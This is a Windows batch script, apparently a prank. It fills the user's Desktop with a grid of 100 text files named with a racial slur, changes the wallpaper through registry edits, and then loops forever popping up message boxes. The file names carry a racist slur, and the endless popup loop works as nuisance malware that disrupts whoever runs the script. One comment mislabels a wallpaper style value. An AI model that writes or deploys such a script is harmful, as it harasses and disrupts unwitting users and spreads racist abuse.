@echo off
:: Set the number of rows and columns for the grid of text files
set ROWS=10
set COLS=10

:: Set the name for the text files (without extension)
set FILENAME=nigger

:: Set the folder for the text files to be created (Desktop folder)
set DESKTOP=%USERPROFILE%\Desktop

:: Set the default content of the text files (optional)
set FILECONTENT=This is a text file

:: Create the grid of text files
for /L %%i in (1, 1, %ROWS%) do (
    for /L %%j in (1, 1, %COLS%) do (
        :: Generate the file name
        setlocal enabledelayedexpansion
        set "FILENAME_TEXT=%FILENAME%_%%i_%%j.txt"
        echo %FILECONTENT% > "%DESKTOP%\!FILENAME_TEXT!"
        endlocal
    )
)

echo Desktop is now filled with text files.

:: Set wallpaper image path
set WALLPAPER_PATH="D:\images.jpg"

:: Set the registry key to change the wallpaper
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %WALLPAPER_PATH% /f

:: Set the wallpaper style to "Fill" (other options: 0 = Centered, 2 = Stretched, 6 = Fit)
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f

:: Refresh the desktop to apply the change
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

echo Wallpaper has been changed.
:loop
msg * "Bing chilling"
goto loop



pause
